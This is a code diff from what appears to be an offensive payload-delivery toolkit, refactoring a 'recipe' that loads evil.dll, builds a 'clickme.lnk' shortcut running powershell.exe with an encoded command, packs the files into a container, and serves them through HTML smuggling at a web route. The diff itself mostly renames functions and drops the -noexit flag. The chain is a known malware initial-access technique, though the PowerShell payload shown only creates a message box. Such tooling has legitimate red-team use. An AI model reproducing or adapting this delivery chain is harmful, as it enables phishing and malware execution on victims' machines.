@@ -4,7 +4,7 @@ from make.iso.iso import makeIso
 from make.powershell.powershell import *
 from make.zip.zip import makeZip
 from make.vbs.vbs import *
-from make.mshta.mshta import *
+from make.hta.hta import *
 from make.onenote.onenote import *
 from make.bat.bat import *
 
@@ -20,15 +20,15 @@ def recipe_1():
     dllData: AceBytes = readFileContent('payloads/evil.dll')
     dllFile: AceFile = makeAceFile('evil.dll', dllData)
 
-    psMsgbox: AceStr = makePowershellMessageBox()
+    psMsgbox: AceStr = makePsScriptMessagebox()
     # LNK to powershell.exe to execute DLL
-    execData: AceStr = makePowershellEncodedCommand(
+    execData: AceStr = makePsEncodedCommand(
         input=psMsgbox,
     )
     lnkData: AceBytes = makeLnk(
         name = "clickme.lnk",
         target = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
-        arguments = "-noexit -EncodedCommand {}".format(execData),
+        arguments = "-EncodedCommand {}".format(execData),
     )
     lnkFile: AceFile = makeAceFile('clickme.lnk', lnkData)
 
@@ -45,7 +45,5 @@ def recipe_1():
     html: AceStr = makeHtmlSmuggling(
         containerFile,
     )
-
-    # serve HTML
     serveHtml: AceRoute = AceRoute('/test', html)
     serve([serveHtml])
